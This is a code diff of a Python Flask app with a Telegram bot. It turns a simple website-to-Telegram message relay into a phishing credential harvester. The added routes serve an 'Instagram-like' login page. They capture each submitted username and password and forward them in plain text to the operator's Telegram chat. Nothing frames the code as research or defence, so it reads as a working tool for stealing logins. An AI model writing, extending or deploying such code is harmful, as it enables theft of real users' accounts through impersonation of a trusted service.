@@ -1,59 +1,48 @@
 import telebot
-from flask import Flask, request
+from flask import Flask, request, render_template
 from threading import Thread
+import os
 
 # --- Telegram Bot Setup ---
-TOKEN = 'YOUR_BOT_TOKEN'
+TOKEN = os.environ.get('TELEGRAM_TOKEN')  # Telegram bot token from environment variables
+CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')  # Chat ID for Telegram bot notifications
 bot = telebot.TeleBot(TOKEN)
 
 # --- Flask Setup ---
 app = Flask(__name__)
 
-# --- Store messages globally ---
-messages = []
-
 # --- Function to send message to Telegram Bot ---
 def send_message_to_bot(message):
-    bot.send_message(chat_id='YOUR_CHAT_ID', text=message)
+    bot.send_message(chat_id=CHAT_ID, text=message)
 
-# --- Handle website form submission ---
-@app.route('/send_message', methods=['POST'])
-def handle_message():
-    # Get message from website form
-    user_message = request.form.get('message')
-    
-    # Send message to Telegram Bot
-    send_message_to_bot(user_message)
-    
-    return "Message sent to bot!"
+# --- Route to serve login page (Instagram-like) ---
+@app.route('/')
+def login_page():
+    return render_template('login_page.html')
+
+# --- Route for form submission (e.g., login) ---
+@app.route('/login', methods=['POST'])
+def handle_login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    # Log the username and password into the Telegram bot
+    send_message_to_bot(f"Login Attempt: Username: {username}, Password: {password}")
+
+    return "Login Attempted. The bot has been notified."
 
 # --- Flask Keep Alive ---
 def run_flask():
     app.run(host='0.0.0.0', port=5000)
 
-# --- Start Flask in a thread to keep it running ---
+# --- Start Flask in a background thread ---
 def start_flask():
     t = Thread(target=run_flask)
     t.daemon = True
     t.start()
 
-# --- Start Flask server for receiving messages ---
+# Start Flask server
 start_flask()
 
-# --- Telegram Bot's /start Command ---
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    bot.reply_to(message, "Hi! Your messages from the website will show here!")
-
-# --- Polling to keep bot running ---
-def run_bot():
-    bot.polling(none_stop=True)
-
-# --- Start Telegram bot in a separate thread ---
-bot_thread = Thread(target=run_bot)
-bot_thread.daemon = True
-bot_thread.start()
-
-# Keep the main thread alive
-while True:
-    pass
+# --- Telegram Bot Polling (Run the bot continuously) ---
+bot.polling(none_stop=True)
